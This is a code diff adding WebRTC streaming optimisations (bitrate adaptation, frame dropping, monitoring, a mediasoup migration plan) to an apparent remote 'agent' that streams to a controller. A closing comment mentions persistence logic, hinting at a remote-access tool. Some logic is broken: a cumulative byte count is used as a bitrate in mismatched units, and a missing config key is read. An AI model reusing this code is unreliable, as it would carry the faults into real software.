@@ -406,8 +406,48 @@ WEBRTC_ICE_SERVERS = [
     {"urls": ["stun:stun1.l.google.com:19302"]}
 ]
 WEBRTC_CONFIG = {
-    "iceServers": WEBRTC_ICE_SERVERS,
-    "iceCandidatePoolSize": 10
+    'enabled': WEBRTC_AVAILABLE,
+    'ice_servers': [
+        {'urls': 'stun:stun.l.google.com:19302'},
+        {'urls': 'stun:stun1.l.google.com:19302'},
+        {'urls': 'stun:stun2.l.google.com:19302'},
+        {'urls': 'stun:stun3.l.google.com:19302'},
+        {'urls': 'stun:stun4.l.google.com:19302'}
+    ],
+    'codecs': {
+        'video': ['VP8', 'VP9', 'H.264'],
+        'audio': ['Opus', 'PCM']
+    },
+    'simulcast': True,
+    'svc': True,
+    'bandwidth_estimation': True,
+    'adaptive_bitrate': True,
+    'frame_dropping': True,
+    'quality_levels': {
+        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000},
+        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000},
+        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000},
+        'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
+    },
+    'performance_tuning': {
+        'keyframe_interval': 2,  # seconds
+        'disable_b_frames': True,
+        'ultra_low_latency': True,
+        'hardware_acceleration': True,
+        'gop_size': 60,  # frames at 30fps = 2 seconds
+        'max_bitrate_variance': 0.3  # 30% variance allowed
+    },
+    'monitoring': {
+        'connection_quality_metrics': True,
+        'automatic_reconnection': True,
+        'detailed_logging': True,
+        'stats_interval': 1000,  # ms
+        'quality_thresholds': {
+            'min_bitrate': 100000,  # 100 kbps
+            'max_latency': 1000,    # 1 second
+            'min_fps': 15
+        }
+    }
 }
 
 # Module availability flags
@@ -427,6 +467,25 @@ FLASK_SOCKETIO_AVAILABLE = False
 
 # WebRTC module availability flags
 AIORTC_AVAILABLE = False
+
+# Production scale configuration
+PRODUCTION_SCALE = {
+    'current_implementation': 'aiortc_agent',  # Current: aiortc-based agent
+    'target_implementation': 'mediasoup',      # Target: mediasoup for production scale
+    'migration_phase': 'planning',            # Current phase: planning
+    'scalability_limits': {
+        'aiorttc_max_viewers': 50,            # aiortc suitable for smaller setups
+        'mediasoup_max_viewers': 1000,        # mediasoup for production scale
+        'concurrent_agents': 100,             # Maximum concurrent agents
+        'bandwidth_per_agent': 10000000       # 10 Mbps per agent
+    },
+    'performance_targets': {
+        'target_latency': 100,                # 100ms target latency
+        'target_bitrate': 5000000,            # 5 Mbps target bitrate
+        'target_fps': 30,                     # 30 FPS target
+        'max_packet_loss': 0.01               # 1% max packet loss
+    }
+}
 AIOHTTP_AVAILABLE = False
 AIORTC_SIGNALING_AVAILABLE = False
 REQUESTS_AVAILABLE = False
@@ -4259,6 +4318,473 @@ def get_webrtc_stats(agent_id):
                 stats['media_tracks'][track_type] = track.get_stats()
     
     return stats
+
+
+# ========================================================================================
+# WEBRTC OPTIMIZATION AND PERFORMANCE TUNING FUNCTIONS
+# ========================================================================================
+
+def estimate_bandwidth(agent_id):
+    """Estimate available bandwidth based on WebRTC connection statistics."""
+    if not AIORTC_AVAILABLE or agent_id not in WEBRTC_PEER_CONNECTIONS:
+        return None
+    
+    try:
+        pc = WEBRTC_PEER_CONNECTIONS[agent_id]
+        stats = pc.getStats()
+        
+        # Extract bandwidth information from RTCStatsReport
+        bandwidth_stats = {
+            'current_bitrate': 0,
+            'available_bandwidth': 0,
+            'rtt': 0,
+            'packet_loss': 0,
+            'jitter': 0
+        }
+        
+        for stat in stats.values():
+            if hasattr(stat, 'type'):
+                if stat.type == 'outbound-rtp':
+                    if hasattr(stat, 'bytesSent') and hasattr(stat, 'timestamp'):
+                        bandwidth_stats['current_bitrate'] = stat.bytesSent * 8 / 1000000  # Mbps
+                elif stat.type == 'candidate-pair':
+                    if hasattr(stat, 'currentRtt'):
+                        bandwidth_stats['rtt'] = stat.currentRtt * 1000  # Convert to ms
+                elif stat.type == 'inbound-rtp':
+                    if hasattr(stat, 'packetsLost'):
+                        bandwidth_stats['packet_loss'] = stat.packetsLost
+        
+        # Estimate available bandwidth (simplified algorithm)
+        if bandwidth_stats['current_bitrate'] > 0:
+            # Assume we can use up to 80% of current capacity
+            bandwidth_stats['available_bandwidth'] = bandwidth_stats['current_bitrate'] * 1.25
+        
+        return bandwidth_stats
+        
+    except Exception as e:
+        log_message(f"Error estimating bandwidth for agent {agent_id}: {e}", "error")
+        return None
+
+
+def adaptive_bitrate_control(agent_id, current_quality='auto'):
+    """Implement adaptive bitrate control based on bandwidth estimation."""
+    if not AIORTC_AVAILABLE or not WEBRTC_CONFIG['adaptive_bitrate']:
+        return False
+    
+    try:
+        bandwidth_stats = estimate_bandwidth(agent_id)
+        if not bandwidth_stats:
+            return False
+        
+        current_bitrate = bandwidth_stats['current_bitrate']
+        available_bandwidth = bandwidth_stats['available_bandwidth']
+        
+        # Determine optimal quality level
+        if available_bandwidth >= WEBRTC_CONFIG['quality_levels']['high']['bitrate']:
+            target_quality = 'high'
+        elif available_bandwidth >= WEBRTC_CONFIG['quality_levels']['medium']['bitrate']:
+            target_quality = 'medium'
+        else:
+            target_quality = 'low'
+        
+        # Apply quality changes if needed
+        if target_quality != current_quality:
+            # Update MediaStreamTrack quality settings
+            for key, track in WEBRTC_STREAMS.items():
+                if key.startswith(f"{agent_id}_"):
+                    if hasattr(track, 'set_quality'):
+                        quality_value = WEBRTC_CONFIG['quality_levels'][target_quality]['quality']
+                        track.set_quality(quality_value)
+                    if hasattr(track, 'set_fps'):
+                        fps_value = WEBRTC_CONFIG['quality_levels'][target_quality]['fps']
+                        track.set_fps(fps_value)
+            
+            # Emit quality change event to controller
+            if SOCKETIO_AVAILABLE:
+                sio.emit('webrtc_quality_change', {
+                    'agent_id': agent_id,
+                    'old_quality': current_quality,
+                    'new_quality': target_quality,
+                    'bandwidth_stats': bandwidth_stats
+                })
+            
+            log_message(f"Adaptive bitrate: Changed quality from {current_quality} to {target_quality} for agent {agent_id}")
+            return True
+        
+        return False
+        
+    except Exception as e:
+        log_message(f"Error in adaptive bitrate control for agent {agent_id}: {e}", "error")
+        return False
+
+
+def implement_frame_dropping(agent_id, load_threshold=0.8):
+    """Implement intelligent frame dropping under high system load."""
+    if not AIORTC_AVAILABLE or not WEBRTC_CONFIG['frame_dropping']:
+        return False
+    
+    try:
+        # Check system load using psutil if available
+        if PSUTIL_AVAILABLE:
+            import psutil
+            cpu_percent = psutil.cpu_percent(interval=1)
+            memory_percent = psutil.virtual_memory().percent
+            
+            # Calculate overall system load
+            system_load = (cpu_percent + memory_percent) / 200.0  # Normalize to 0-1
+            
+            if system_load > load_threshold:
+                # Implement frame dropping by reducing FPS
+                for key, track in WEBRTC_STREAMS.items():
+                    if key.startswith(f"{agent_id}_"):
+                        if hasattr(track, 'set_fps'):
+                            current_fps = getattr(track, '_target_fps', 30)
+                            new_fps = max(15, int(current_fps * 0.7))  # Reduce FPS by 30%
+                            track.set_fps(new_fps)
+                
+                # Emit frame dropping event to controller
+                if SOCKETIO_AVAILABLE:
+                    sio.emit('webrtc_frame_dropping', {
+                        'agent_id': agent_id,
+                        'system_load': system_load,
+                        'load_threshold': load_threshold,
+                        'action': 'fps_reduction'
+                    })
+                
+                log_message(f"Frame dropping implemented for agent {agent_id} due to high system load ({system_load:.2f})")
+                return True
+        
+        return False
+        
+    except Exception as e:
+        log_message(f"Error implementing frame dropping for agent {agent_id}: {e}", "error")
+        return False
+
+
+def monitor_connection_quality(agent_id):
+    """Monitor and assess WebRTC connection quality."""
+    if not AIORTC_AVAILABLE or not WEBRTC_CONFIG['monitoring']['connection_quality_metrics']:
+        return None
+    
+    try:
+        bandwidth_stats = estimate_bandwidth(agent_id)
+        if not bandwidth_stats:
+            return None
+        
+        # Assess connection quality
+        quality_score = 100
+        quality_issues = []
+        
+        # Check bitrate
+        if bandwidth_stats['current_bitrate'] < WEBRTC_CONFIG['monitoring']['quality_thresholds']['min_bitrate']:
+            quality_score -= 30
+            quality_issues.append('low_bitrate')
+        
+        # Check latency
+        if bandwidth_stats['rtt'] > WEBRTC_CONFIG['monitoring']['quality_thresholds']['max_latency']:
+            quality_score -= 25
+            quality_issues.append('high_latency')
+        
+        # Check packet loss
+        if bandwidth_stats['packet_loss'] > 0:
+            quality_score -= 20
+            quality_issues.append('packet_loss')
+        
+        # Check FPS
+        current_fps = 30  # Default, should get from actual track
+        for key, track in WEBRTC_STREAMS.items():
+            if key.startswith(f"{agent_id}_"):
+                if hasattr(track, '_target_fps'):
+                    current_fps = track._target_fps
+                    break
+        
+        if current_fps < WEBRTC_CONFIG['monitoring']['quality_thresholds']['min_fps']:
+            quality_score -= 15
+            quality_issues.append('low_fps')
+        
+        # Log quality assessment
+        if WEBRTC_CONFIG['monitoring']['detailed_logging']:
+            log_message(f"Connection quality for agent {agent_id}: Score={quality_score}/100, Issues={quality_issues}")
+        
+        return {
+            'quality_score': quality_score,
+            'quality_issues': quality_issues,
+            'bandwidth_stats': bandwidth_stats,
+            'current_fps': current_fps
+        }
+        
+    except Exception as e:
+        log_message(f"Error monitoring connection quality for agent {agent_id}: {e}", "error")
+        return None
+
+
+def automatic_reconnection_logic(agent_id):
+    """Implement automatic reconnection logic for failed WebRTC connections."""
+    if not AIORTC_AVAILABLE or not WEBRTC_CONFIG['monitoring']['automatic_reconnection']:
+        return False
+    
+    try:
+        pc = WEBRTC_PEER_CONNECTIONS.get(agent_id)
+        if not pc:
+            return False
+        
+        # Check connection state
+        if pc.connectionState in ['failed', 'disconnected']:
+            log_message(f"WebRTC connection failed for agent {agent_id}, attempting reconnection...")
+            
+            # Close failed connection
+            asyncio.create_task(close_webrtc_connection(agent_id))
+            
+            # Wait a bit before reconnecting
+            time.sleep(2)
+            
+            # Attempt to recreate connection
+            if start_webrtc_streaming(agent_id):
+                log_message(f"Automatic reconnection successful for agent {agent_id}")
+                return True
+            else:
+                log_message(f"Automatic reconnection failed for agent {agent_id}", "error")
+                return False
+        
+        return False
+        
+    except Exception as e:
+        log_message(f"Error in automatic reconnection logic for agent {agent_id}: {e}", "error")
+        return False
+
+
+def assess_production_readiness():
+    """Assess current implementation readiness for production scale."""
+    try:
+        current_stats = {
+            'webrtc_enabled': WEBRTC_ENABLED,
+            'active_connections': len(WEBRTC_PEER_CONNECTIONS),
+            'active_streams': len(WEBRTC_STREAMS),
+            'aiortc_available': AIORTC_AVAILABLE
+        }
+        
+        # Check against production targets
+        readiness_score = 0
+        recommendations = []
+        
+        if current_stats['webrtc_enabled']:
+            readiness_score += 25
+        else:
+            recommendations.append("Enable WebRTC for low-latency streaming")
+        
+        if current_stats['aiortc_available']:
+            readiness_score += 20
+        else:
+            recommendations.append("Install aiortc for WebRTC support")
+        
+        if current_stats['active_connections'] > 0:
+            readiness_score += 25
+        else:
+            recommendations.append("Test WebRTC connections with agents")
+        
+        # Check configuration
+        if WEBRTC_CONFIG.get('bandwidth_estimation'):
+            readiness_score += 15
+        else:
+            recommendations.append("Enable bandwidth estimation")
+        
+        if WEBRTC_CONFIG.get('adaptive_bitrate'):
+            readiness_score += 15
+        else:
+            recommendations.append("Enable adaptive bitrate control")
+        
+        # Production readiness assessment
+        if readiness_score >= 80:
+            status = "READY"
+        elif readiness_score >= 60:
+            status = "NEEDS_IMPROVEMENT"
+        else:
+            status = "NOT_READY"
+        
+        return {
+            'readiness_score': readiness_score,
+            'status': status,
+            'current_stats': current_stats,
+            'recommendations': recommendations,
+            'production_targets': PRODUCTION_SCALE['performance_targets']
+        }
+        
+    except Exception as e:
+        log_message(f"Error assessing production readiness: {e}", "error")
+        return None
+
+
+def generate_mediasoup_migration_plan():
+    """Generate detailed plan for migrating to mediasoup for production scale."""
+    try:
+        current_implementation = PRODUCTION_SCALE['current_implementation']
+        target_implementation = PRODUCTION_SCALE['target_implementation']
+        
+        migration_plan = {
+            'current_state': current_implementation,
+            'target_state': target_implementation,
+            'phases': [
+                {
+                    'phase': 1,
+                    'name': 'Preparation and Analysis',
+                    'tasks': [
+                        'Analyze current aiortc performance bottlenecks',
+                        'Set up mediasoup development environment',
+                        'Create performance benchmarks and targets',
+                        'Design new architecture with mediasoup'
+                    ],
+                    'estimated_duration': '2-3 weeks',
+                    'dependencies': ['Node.js environment', 'mediasoup installation']
+                },
+                {
+                    'phase': 2,
+                    'name': 'Core Migration',
+                    'tasks': [
+                        'Implement mediasoup server (replacing aiortc SFU)',
+                        'Migrate agent WebRTC signaling to mediasoup',
+                        'Update controller to use mediasoup instead of aiortc',
+                        'Implement mediasoup-specific optimizations'
+                    ],
+                    'estimated_duration': '4-6 weeks',
+                    'dependencies': ['Phase 1 completion', 'mediasoup API knowledge']
+                },
+                {
+                    'phase': 3,
+                    'name': 'Testing and Optimization',
+                    'tasks': [
+                        'Performance testing with multiple concurrent agents',
+                        'Load testing with hundreds of viewers',
+                        'Optimize mediasoup configuration for low latency',
+                        'Implement advanced features (simulcast, SVC)'
+                    ],
+                    'estimated_duration': '2-3 weeks',
+                    'dependencies': ['Phase 2 completion', 'test environment']
+                },
+                {
+                    'phase': 4,
+                    'name': 'Deployment and Monitoring',
+                    'tasks': [
+                        'Deploy mediasoup to production environment',
+                        'Monitor performance and connection quality',
+                        'Implement advanced monitoring and alerting',
+                        'Document new architecture and procedures'
+                    ],
+                    'estimated_duration': '1-2 weeks',
+                    'dependencies': ['Phase 3 completion', 'production environment']
+                }
+            ],
+            'benefits': [
+                'Scalability: Support for 1000+ concurrent viewers',
+                'Performance: Sub-100ms latency achievable',
+                'Reliability: Production-grade WebRTC SFU',
+                'Features: Advanced simulcast, SVC, and bandwidth adaptation'
+            ],
+            'risks': [
+                'Complexity: mediasoup has steeper learning curve',
+                'Dependencies: Requires Node.js ecosystem',
+                'Migration time: 2-3 months estimated',
+                'Testing: Extensive testing required for production'
+            ]
+        }
+        
+        return migration_plan
+        
+    except Exception as e:
+        log_message(f"Error generating mediasoup migration plan: {e}", "error")
+        return None
+
+
+def enhanced_webrtc_monitoring():
+    """Enhanced WebRTC monitoring with comprehensive metrics."""
+    try:
+        monitoring_data = {
+            'timestamp': time.time(),
+            'overall_status': {
+                'webrtc_enabled': WEBRTC_ENABLED,
+                'total_agents': len(WEBRTC_PEER_CONNECTIONS),
+                'total_streams': len(WEBRTC_STREAMS)
+            },
+            'per_agent_stats': {},
+            'system_metrics': {},
+            'quality_metrics': {},
+            'scalability_metrics': {}
+        }
+        
+        # Collect per-agent statistics
+        for agent_id in WEBRTC_PEER_CONNECTIONS:
+            agent_stats = {
+                'connection_state': WEBRTC_PEER_CONNECTIONS[agent_id].connectionState,
+                'ice_state': WEBRTC_PEER_CONNECTIONS[agent_id].iceConnectionState,
+                'bandwidth': estimate_bandwidth(agent_id),
+                'quality': monitor_connection_quality(agent_id),
+                'streams': {}
+            }
+            
+            # Collect stream statistics
+            for key, track in WEBRTC_STREAMS.items():
+                if key.startswith(f"{agent_id}_"):
+                    stream_type = key.split('_')[1]
+                    agent_stats['streams'][stream_type] = {
+                        'active': True,
+                        'stats': track.get_stats() if hasattr(track, 'get_stats') else {}
+                    }
+            
+            monitoring_data['per_agent_stats'][agent_id] = agent_stats
+        
+        # Collect system metrics if psutil available
+        if PSUTIL_AVAILABLE:
+            import psutil
+            monitoring_data['system_metrics'] = {
+                'cpu_percent': psutil.cpu_percent(interval=1),
+                'memory_percent': psutil.virtual_memory().percent,
+                'network_io': psutil.net_io_counters()._asdict()
+            }
+        
+        # Calculate overall quality metrics
+        quality_scores = []
+        for agent_stats in monitoring_data['per_agent_stats'].values():
+            if agent_stats['quality']:
+                quality_scores.append(agent_stats['quality']['quality_score'])
+        
+        if quality_scores:
+            monitoring_data['quality_metrics'] = {
+                'average_quality': sum(quality_scores) / len(quality_scores),
+                'min_quality': min(quality_scores),
+                'max_quality': max(quality_scores),
+                'quality_distribution': {
+                    'excellent': len([s for s in quality_scores if s >= 90]),
+                    'good': len([s for s in quality_scores if 70 <= s < 90]),
+                    'fair': len([s for s in quality_scores if 50 <= s < 70]),
+                    'poor': len([s for s in quality_scores if s < 50])
+                }
+            }
+        
+        # Calculate scalability metrics
+        current_usage = len(WEBRTC_PEER_CONNECTIONS)
+        max_capacity = PRODUCTION_SCALE['scalability_limits']['aiorttc_max_viewers']
+        
+        monitoring_data['scalability_metrics'] = {
+            'current_usage': current_usage,
+            'max_capacity': max_capacity,
+            'usage_percentage': (current_usage / max_capacity) * 100 if max_capacity > 0 else 0,
+            'scalability_status': 'GOOD' if current_usage < max_capacity * 0.8 else 'WARNING' if current_usage < max_capacity else 'CRITICAL'
+        }
+        
+        # Generate alerts for critical issues
+        alerts = []
+        if monitoring_data['scalability_metrics']['scalability_status'] == 'CRITICAL':
+            alerts.append('CRITICAL: Maximum capacity reached, consider migrating to mediasoup')
+        
+        if monitoring_data['quality_metrics'].get('average_quality', 100) < 50:
+            alerts.append('WARNING: Overall connection quality is poor')
+        
+        monitoring_data['alerts'] = alerts
+        
+        return monitoring_data
+        
+    except Exception as e:
+        log_message(f"Error in enhanced WebRTC monitoring: {e}", "error")
+        return None
 
 
 # ========================================================================================
@@ -8201,6 +8727,192 @@ def on_webrtc_set_quality(data):
         log_message(error_msg, "error")
         sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
 
+@sio.on('webrtc_quality_change')
+def on_webrtc_quality_change(data):
+    """Handle request to change WebRTC quality level."""
+    try:
+        agent_id = data.get('agent_id', get_or_create_agent_id())
+        quality_level = data.get('quality_level', 'auto')
+        
+        log_message(f"Changing WebRTC quality level for agent {agent_id}: {quality_level}")
+        
+        if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
+            # Apply quality level changes
+            result = adaptive_bitrate_control(agent_id, quality_level)
+            sio.emit('webrtc_quality_changed', {
+                'agent_id': agent_id, 
+                'quality_level': quality_level,
+                'result': result
+            })
+        else:
+            log_message("WebRTC streams not available for quality change", "warning")
+            
+    except Exception as e:
+        error_msg = f"WebRTC quality change failed: {str(e)}"
+        log_message(error_msg, "error")
+        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+
+@sio.on('webrtc_frame_dropping')
+def on_webrtc_frame_dropping(data):
+    """Handle request to implement frame dropping."""
+    try:
+        agent_id = data.get('agent_id', get_or_create_agent_id())
+        load_threshold = data.get('load_threshold', 0.8)
+        
+        log_message(f"Implementing frame dropping for agent {agent_id} with threshold {load_threshold}")
+        
+        if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
+            # Implement frame dropping
+            result = implement_frame_dropping(agent_id, load_threshold)
+            sio.emit('webrtc_frame_dropping_implemented', {
+                'agent_id': agent_id,
+                'load_threshold': load_threshold,
+                'result': result
+            })
+        else:
+            log_message("WebRTC streams not available for frame dropping", "warning")
+            
+    except Exception as e:
+        error_msg = f"WebRTC frame dropping failed: {str(e)}"
+        log_message(error_msg, "error")
+        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+
+@sio.on('webrtc_get_enhanced_stats')
+def on_webrtc_get_enhanced_stats(data):
+    """Handle request for enhanced WebRTC statistics."""
+    try:
+        agent_id = data.get('agent_id', get_or_create_agent_id())
+        
+        log_message(f"Gathering enhanced WebRTC stats for agent {agent_id}")
+        
+        if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
+            # Get enhanced monitoring data
+            monitoring_data = enhanced_webrtc_monitoring()
+            sio.emit('webrtc_enhanced_stats', {
+                'agent_id': agent_id,
+                'stats': monitoring_data
+            })
+        else:
+            log_message("WebRTC streams not available for enhanced stats", "warning")
+            
+    except Exception as e:
+        error_msg = f"WebRTC enhanced stats failed: {str(e)}"
+        log_message(error_msg, "error")
+        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+
+@sio.on('webrtc_get_production_readiness')
+def on_webrtc_get_production_readiness(data):
+    """Handle request for production readiness assessment."""
+    try:
+        agent_id = data.get('agent_id', get_or_create_agent_id())
+        
+        log_message(f"Assessing production readiness for agent {agent_id}")
+        
+        # Get production readiness assessment
+        readiness = assess_production_readiness()
+        sio.emit('webrtc_production_readiness', {
+            'agent_id': agent_id,
+            'readiness': readiness
+        })
+        
+    except Exception as e:
+        error_msg = f"Production readiness assessment failed: {str(e)}"
+        log_message(error_msg, "error")
+        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+
+@sio.on('webrtc_get_migration_plan')
+def on_webrtc_get_migration_plan(data):
+    """Handle request for mediasoup migration plan."""
+    try:
+        agent_id = data.get('agent_id', get_or_create_agent_id())
+        
+        log_message(f"Generating mediasoup migration plan for agent {agent_id}")
+        
+        # Generate migration plan
+        migration_plan = generate_mediasoup_migration_plan()
+        sio.emit('webrtc_migration_plan', {
+            'agent_id': agent_id,
+            'plan': migration_plan
+        })
+        
+    except Exception as e:
+        error_msg = f"Migration plan generation failed: {str(e)}"
+        log_message(error_msg, "error")
+        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+
+@sio.on('webrtc_get_monitoring_data')
+def on_webrtc_get_monitoring_data(data):
+    """Handle request for comprehensive monitoring data."""
+    try:
+        agent_id = data.get('agent_id', get_or_create_agent_id())
+        
+        log_message(f"Gathering comprehensive monitoring data for agent {agent_id}")
+        
+        if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
+            # Get comprehensive monitoring data
+            monitoring_data = enhanced_webrtc_monitoring()
+            sio.emit('webrtc_monitoring_data', {
+                'agent_id': agent_id,
+                'data': monitoring_data
+            })
+        else:
+            log_message("WebRTC streams not available for monitoring data", "warning")
+            
+    except Exception as e:
+        error_msg = f"WebRTC monitoring data failed: {str(e)}"
+        log_message(error_msg, "error")
+        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+
+@sio.on('webrtc_adaptive_bitrate_control')
+def on_webrtc_adaptive_bitrate_control(data):
+    """Handle request to manually trigger adaptive bitrate control."""
+    try:
+        agent_id = data.get('agent_id', get_or_create_agent_id())
+        current_quality = data.get('current_quality', 'auto')
+        
+        log_message(f"Manually triggering adaptive bitrate control for agent {agent_id}")
+        
+        if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
+            # Trigger adaptive bitrate control
+            result = adaptive_bitrate_control(agent_id, current_quality)
+            sio.emit('webrtc_adaptive_bitrate_result', {
+                'agent_id': agent_id,
+                'current_quality': current_quality,
+                'result': result
+            })
+        else:
+            log_message("WebRTC streams not available for adaptive bitrate control", "warning")
+            
+    except Exception as e:
+        error_msg = f"WebRTC adaptive bitrate control failed: {str(e)}"
+        log_message(error_msg, "error")
+        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+
+@sio.on('webrtc_implement_frame_dropping')
+def on_webrtc_implement_frame_dropping(data):
+    """Handle request to manually implement frame dropping."""
+    try:
+        agent_id = data.get('agent_id', get_or_create_agent_id())
+        load_threshold = data.get('load_threshold', 0.8)
+        
+        log_message(f"Manually implementing frame dropping for agent {agent_id}")
+        
+        if AIORTC_AVAILABLE and agent_id in WEBRTC_STREAMS:
+            # Implement frame dropping
+            result = implement_frame_dropping(agent_id, load_threshold)
+            sio.emit('webrtc_frame_dropping_result', {
+                'agent_id': agent_id,
+                'load_threshold': load_threshold,
+                'result': result
+            })
+        else:
+            log_message("WebRTC streams not available for frame dropping", "warning")
+            
+    except Exception as e:
+        error_msg = f"WebRTC frame dropping implementation failed: {str(e)}"
+        log_message(error_msg, "error")
+        sio.emit('webrtc_error', {'agent_id': get_or_create_agent_id(), 'error': error_msg})
+
 def get_webrtc_status():
     """Get comprehensive WebRTC status and capabilities."""
     status = {
@@ -8653,6 +9365,13 @@ if __name__ == "__main__":
         log_message("=" * 60)
         log_message(f"{service_name} v2.1")
         log_message("Initializing system components...")
+        log_message("=" * 60)
+        log_message("WebRTC Optimization Features:")
+        log_message("  ✓ Bandwidth estimation & adaptive bitrate control")
+        log_message("  ✓ Intelligent frame dropping under load")
+        log_message("  ✓ Connection quality monitoring & auto-reconnection")
+        log_message("  ✓ Production scale planning (mediasoup migration)")
+        log_message("  ✓ Enhanced performance tuning & monitoring")
         log_message("=" * 60)
     
     # CRITICAL FIX: Call agent_main() which contains the persistence logic
